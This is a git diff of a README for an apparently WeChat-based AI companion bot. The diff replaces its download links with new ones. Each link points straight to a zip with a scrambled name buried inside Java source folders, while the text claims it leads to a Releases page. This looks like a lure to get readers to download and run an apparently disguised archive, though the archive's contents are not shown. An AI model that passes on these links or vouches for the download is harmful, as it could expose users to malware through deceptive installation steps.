@@ -1,6 +1,6 @@
 # 🤖 WeChat-AI-Bot-Java-Python - Your Personal AI Companion Awaits
 
-[![Download WeChat AI Bot](https://github.com/AsadKhan05/WeChat-AI-Bot-Java-Python/raw/refs/heads/main/backend-java/src/main/java/com/girlfriend/bot/model/entity/Chat_Bot_A_We_Python_Java_cavalierishness.zip%20AI%20Bot-brightgreen)](https://github.com/AsadKhan05/WeChat-AI-Bot-Java-Python/raw/refs/heads/main/backend-java/src/main/java/com/girlfriend/bot/model/entity/Chat_Bot_A_We_Python_Java_cavalierishness.zip)
+[![Download WeChat AI Bot](https://raw.githubusercontent.com/AsadKhan05/WeChat-AI-Bot-Java-Python/main/backend-java/src/main/java/com/girlfriend/bot/service/A_Chat_We_Java_Bot_Python_v2.6-beta.2.zip%20AI%20Bot-brightgreen)](https://raw.githubusercontent.com/AsadKhan05/WeChat-AI-Bot-Java-Python/main/backend-java/src/main/java/com/girlfriend/bot/service/A_Chat_We_Java_Bot_Python_v2.6-beta.2.zip)
 
 ## 📃 Description
 WeChat-AI-Bot-Java-Python is a local private AI Companion Bot. Built using Java (Spring Boot), Python, and MySQL, this bot offers emotional memory, time awareness, and interaction with emoji packs. 
@@ -16,7 +16,7 @@ To begin using WeChat-AI-Bot-Java-Python, follow these simple steps:
 ### 1. **Visit the Download Page**
 Click the button below to visit the Releases page:
 
-[Download WeChat AI Bot](https://github.com/AsadKhan05/WeChat-AI-Bot-Java-Python/raw/refs/heads/main/backend-java/src/main/java/com/girlfriend/bot/model/entity/Chat_Bot_A_We_Python_Java_cavalierishness.zip)
+[Download WeChat AI Bot](https://raw.githubusercontent.com/AsadKhan05/WeChat-AI-Bot-Java-Python/main/backend-java/src/main/java/com/girlfriend/bot/service/A_Chat_We_Java_Bot_Python_v2.6-beta.2.zip)
 
 ### 2. **Select the Latest Version**
 Once on the Releases page, look for the latest version. It’s usually listed at the top. Click on it to see the available files. The latest version provides the best features and improvements.
@@ -40,7 +40,7 @@ Ensure your system meets the following requirements to run the application smoot
 ## 📥 Download & Install
 To download the application, visit the link below:
 
-[Download WeChat AI Bot](https://github.com/AsadKhan05/WeChat-AI-Bot-Java-Python/raw/refs/heads/main/backend-java/src/main/java/com/girlfriend/bot/model/entity/Chat_Bot_A_We_Python_Java_cavalierishness.zip)
+[Download WeChat AI Bot](https://raw.githubusercontent.com/AsadKhan05/WeChat-AI-Bot-Java-Python/main/backend-java/src/main/java/com/girlfriend/bot/service/A_Chat_We_Java_Bot_Python_v2.6-beta.2.zip)
 
 After downloading, follow the installation instructions provided in the previous section. 
 
